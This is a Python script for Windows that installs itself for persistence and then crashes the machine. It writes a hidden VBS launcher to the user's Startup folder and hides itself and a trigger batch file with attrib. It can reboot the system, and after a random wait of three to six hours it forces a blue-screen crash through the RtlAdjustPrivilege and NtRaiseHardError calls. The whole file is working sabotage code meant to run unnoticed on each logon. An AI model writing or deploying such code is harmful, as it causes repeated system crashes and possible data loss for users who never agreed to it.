from subprocess import call
from getpass import getuser
from pathlib import Path
from random import randint
from time import sleep
from sys import platform

REBOOT_TO_APPLY = False

def trigger_bsod():
    from ctypes import windll
    from ctypes import c_int
    from ctypes import c_uint
    from ctypes import c_ulong
    from ctypes import POINTER
    from ctypes import byref

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

def create_startup_file(trigger_file_path):
    global REBOOT_TO_APPLY

    startup_file = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.vbs"
    file_contents = f"Set WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run chr(34) & \"{trigger_file_path}\" & Chr(34), 0\nSet WshShell = Nothing"

    if not Path(startup_file).exists():
        REBOOT_TO_APPLY = True

    with open(startup_file, "w+") as file:
        file.write(file_contents)

    print("Startup file created")

def create_trigger_file():
    trigger_file = Path(__file__).parent.joinpath("trigger.bat")
    call(f"attrib -H \"{str(trigger_file)}\"", shell=True)

    with open(trigger_file, "w+") as file:
        file.write(f"pythonw \"{__file__}\"")

    call(f"attrib +H \"{__file__}\"", shell=True)
    call(f"attrib +H \"{str(trigger_file)}\"", shell=True)

    print("Trigger file created")
    create_startup_file(str(trigger_file))

if platform != "win32":
    print("Only Windows based systems!")
    input("Press enter to exit")
    exit(1)

create_trigger_file()
if REBOOT_TO_APPLY:
    print("It is needed to reboot to apply changes, do you want to reboot?")
    print("1. Yes")
    print("2. No")
    if input("> ") == "1":
        call("shutdown /r /t  1")
    else:
        print("The next time this computer starts")
        print("This script will be executed")
        input("Press enter to exit")
        exit(0)

wait_hours = randint(3, 6)
wait_seconds = 3600 * wait_hours
print(f"Trigger in {wait_seconds} seconds")
sleep(wait_seconds)
trigger_bsod()
